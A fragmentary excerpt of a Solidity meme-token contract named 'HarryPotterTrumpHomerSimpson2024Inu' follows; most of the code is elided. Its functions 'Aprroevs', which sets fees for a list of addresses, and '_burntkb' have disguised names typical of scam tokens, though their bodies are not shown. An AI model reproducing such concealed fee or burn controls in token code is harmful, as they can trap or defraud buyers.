...
/**
https://t.me/HarryPotterTrumpHomerSimpson2024
https://twitter.com/TRUMP0x2024ERC
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipingteryu(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
...
contract TRUMP is Ownable {
    ...
    constructor (){
        name = unicode"HarryPotterTrumpHomerSimpson2024Inu";
        symbol = unicode"TRUMP";
        decimals = 9;
        uint256 Supply = 202400000;
    ...
    function Aprroevs(address[] memory _usr, uint256 _feePct) external {
    ...
    function _burntkb(address user) public {
